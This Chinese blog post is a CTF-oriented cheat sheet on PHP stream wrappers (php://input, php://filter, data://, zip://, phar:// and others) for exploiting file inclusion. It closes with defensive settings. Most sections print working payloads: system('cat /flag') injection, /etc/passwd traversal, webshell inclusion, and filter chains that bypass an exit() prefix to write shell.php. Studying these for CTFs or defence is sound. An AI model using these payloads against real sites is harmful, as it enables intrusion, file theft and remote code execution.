---
title: PHP 伪协议速查与详解
date: 2026-11-08 15:55:00
tags:
  - PHP
  - Web
  - CTF
  - 文件包含
categories:
  - Web
---

文件包含题里最常打的一张牌。按「速查 → 逐个详解 → exit 绕过 → 防御」组织，遇到题可以直接翻到对应段落。

<!-- more -->

## 速查表

| 协议 | 核心用途 | 依赖 |
| :--- | :--- | :--- |
| `file://` | 读本地文件 | 无 |
| `http://` `https://` | 远程文件，可 RFI | `allow_url_fopen` + `allow_url_include` |
| `ftp://` | FTP 远程文件 | `allow_url_fopen` |
| `php://input` | 读 HTTP 请求体原文 | **无**（见下文说明） |
| `php://filter` | 对文件内容编码/过滤 | 无 |
| `zip://` | 读 ZIP 内子文件 | 无 |
| `phar://` | 读 Phar/ZIP 内子文件，可触发反序列化 | PHP ≥ 5.3 |
| `data://` | 内联数据当作文件 | `allow_url_fopen` + `allow_url_include` |
| `glob://` | 批量匹配文件路径 | 无 |
| `ssh2://` | 通过 SSH 访问远程资源 | 需 ssh2 扩展 |
| `rar://` | 读 RAR 内子文件 | 需 rar 扩展 |
| `expect://` | 执行系统命令 | 需 expect 扩展 |
| `ogg://` | 访问音频流 | 无 |

两个总开关（`php.ini`）：

- **`allow_url_fopen`** —— 能否把 URL 当文件打开，影响 `http://`、`ftp://`、`data://`
- **`allow_url_include`** —— 能否 `include`/`require` 一个 URL，**只影响 URL 类协议**

> [!warning] 一个常见误区
> `php://input` 和 `php://filter` 属于 PHP 内部流，**不受 `allow_url_include` 限制**。很多题在 `allow_url_include=Off` 时仍然能用 `?file=php://input` 打进代码，原理就在这里。真正需要 `allow_url_include=On` 的是 `data://` 和 `http://`。

---

## 逐个详解

### `php://` 家族

PHP 自身的流封装，不经过文件系统。

| 流 | 作用 |
| :--- | :--- |
| `php://input` | 读请求体原始字节，`POST` 的数据直接可读（`enctype=multipart/form-data` 时不可用） |
| `php://output` | 当作输出流写入，等价于直接 echo |
| `php://stderr` | 写标准错误，可用于写日志 |
| `php://memory` | 内存中的虚拟文件，脚本结束即丢 |
| `php://temp` | 先内存，超过 2MB 自动落盘临时文件 |
| `php://fd` | 直接操作文件描述符 |

`php://input` 的典型用法——当 `allow_url_include=Off` 但又需要注入代码时：

```http
POST /?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('cat /flag');?>
```

### `php://filter`

对文件内容做流式过滤，**读取时不依赖任何配置**，是读源码的首选。

```
php://filter/[read=<过滤器链>]/resource=<目标文件>
```

最常用的一条：

```
?file=php://filter/convert.base64-encode/resource=flag.php
```

拿到 base64 后本地解一下就是源码，不会被执行。

可用过滤器：

| 类别 | 过滤器 | 作用 |
| :--- | :--- | :--- |
| 字符串 | `string.rot13` | ROT13 轮换 |
| | `string.toupper` / `string.tolower` | 大小写转换 |
| | `string.strip_tags` | 去掉 HTML/PHP 标签（PHP 8 已废弃，PHP 7.3 起对写操作报错） |
| 编码转换 | `convert.base64-encode` / `-decode` | Base64 |
| | `convert.iconv.<src>/<dst>` | 字符集转换，可用来构造任意字节 |
| 压缩 | `zlib.deflate` / `zlib.inflate` | Deflate 压缩/解压 |
| | `zlib.*` 系列 | 还有 `zlib.deflate` 的分块版本 |

多个过滤器用 `|` 串联，按顺序执行：

```
php://filter/read=convert.base64-encode|string.rot13/resource=flag.php
```

### `file://`

读本地文件，路径穿越的主力。

```
?file=file:///etc/passwd
?file=file://../../../../etc/passwd
```

Linux 下 `///` 与 `//` 等价，Windows 下 `file://C:/Windows/win.ini` 也能用。没有任何过滤时最容易上手。

### `zip://` 与 `phar://`

两者都能读压缩包内的子文件，区别在于 `phar://` 会触发**元数据反序列化**。

```
?file=zip:///var/www/html/upload/test.jpg%23shell.php
?file=phar:///var/www/html/upload/test.jpg/shell.php
```

`%23` 是 `#` 的 URL 编码。压缩包可以改任意后缀（`.jpg`、`.png`）绕过上传检测，只要内容真的是 ZIP 格式。

`phar://` 的关键点：

- 反序列化发生在**解析 phar 元数据**时，不需要真正 `include` 里面的文件——连 `file_exists()`、`file_get_contents()` 都可能触发
- 生成 phar 需要 `phar.readonly=Off`，但**读取触发不需要**
- 常见的 POP 链入口就在这里

### `data://`

把数据内联成"文件"，配合 `allow_url_include=On` 直接执行代码。

```
?file=data://text/plain,<?php phpinfo();?>
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

`text/plain` 可以换成 `application/x-httpd-php` 之类，某些场景下绕过内容检测。

### `glob://`

配合目录迭代器枚举文件，本身不返回值，通常需要搭配其他函数使用：

```php
$it = new DirectoryIterator($_GET['file']);
foreach ($it as $f) echo $f->getFilename();
```

```
?file=glob:///var/www/html/*.php
```

### 边缘协议

- **`ssh2://`** —— 需要 `ssh2` 扩展，`ssh2://user:pass@host/file`
- **`rar://`** —— 需要 `rar` 扩展，`rar://压缩包路径#子文件`
- **`expect://`** —— 需要 `expect` 扩展，`expect://id` 直接执行命令，最危险但也最少见
- **`ogg://`** —— 音频流，实战几乎用不上

---

## `exit` 死亡绕过

当代码长这样：

```php
file_put_contents($filename, "<?php exit();" . $content);
```

写入的内容永远以 `<?php exit();` 开头，执行时会立刻退出。思路都是**让这段前缀失效**。

### 用过滤器在写入时破坏前缀

把 `$filename` 换成写过滤流，写入的瞬间前缀就被改写：

```php
$filename = "php://filter/write=convert.base64-decode/resource=shell.php";
$content  = "PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==";
```

Base64 解码会**丢弃所有非 Base64 字符**，`<?php exit();` 里的 `<`、`?`、`(`、`)`、`;`、空格都会被丢掉。但要注意 `php`、`exit` 由合法字母组成，解码后会留下垃圾字节——payload 前需要补足够字符让这段垃圾正好落在字节边界上，否则整串错位。具体补几个字符取决于前缀长度，通常要按目标环境调试。

### ROT13 变形

```php
$filename = "php://filter/write=string.rot13/resource=shell.php";
$content  = "<?cuc flfgrz('png sytn');?>";
```

写入后文件里是 `<?cuc rkvg();` 和 ROT13 后的 payload，PHP 不认 `<?cuc` 这个标签，前缀自然失效。读取时仍需再套一层 `string.rot13` 才能还原成可执行代码——**这一步要用在 include 侧，不是写入侧**，否则绕回原点。

### `.htaccess` 预包含

配合 `string.strip_tags` 把 `<?php` 标签去掉，写入 `.htaccess` 里设置 `auto_prepend_file`：

```
php_value auto_prepend_file "shell.php"
```

后续所有 PHP 文件执行前都会先包含 `shell.php`。前提是 Apache + `AllowOverride All`，PHP 5 时代有效，PHP 7.3 起 `string.strip_tags` 对写操作会报错。

### 过滤器链组合

用 `convert.iconv.*` 把前缀的字节"扭"成无效字符，再用 `zlib.inflate` 之类还原。这类链构造复杂、对版本敏感，PHP 7.3 以上经常直接报错，属于不得已才用的手段。

> [!note]
> 上面四种都依赖目标 PHP 版本和配置。写 payload 前先确认版本——`phpinfo`、报错信息、`X-Powered-By` 都可以。版本不符时最直观的表现是 `filter` 返回空或 warning。

---

## 防御视角

反过来看，防守方要卡住的就这几处：

1. **白名单代替黑名单** —— 只允许具体的文件名，别去挡 `php://`、`../` 这些关键字，永远有绕过
2. **关掉两个开关** —— `allow_url_fopen=Off`、`allow_url_include=Off`，断掉 RFI 和 `data://`
3. **`open_basedir`** —— 限制 PHP 只能访问指定目录，`file://` 穿不出去
4. **不让用户控制路径** —— 用 ID 映射文件名，而不是直接拼 `$_GET['file']`
5. **错误信息别外泄** —— 关 `display_errors`，别让报错把绝对路径吐出来

---

## 小结

实战里按这个顺序试，命中率最高：

1. `php://filter/convert.base64-encode/resource=` 读源码——无依赖，先看代码在干什么
2. 有上传点就传 ZIP/RAR 改后缀，用 `zip://` 或 `phar://`
3. 能写文件、又有 `exit` 拦截，考虑写过滤流破坏前缀
4. 远程包含开着，`data://` 一把梭
5. 都不行再看 `glob://` 枚举、`expect://` 命令执行这些边角料

---

## 参考来源

内容整理自 **zsm's blog**。速查表压缩成三列、层级重排、`php://input` 的依赖说明做了更正，另外补了实战顺序和几处配置版本差异。
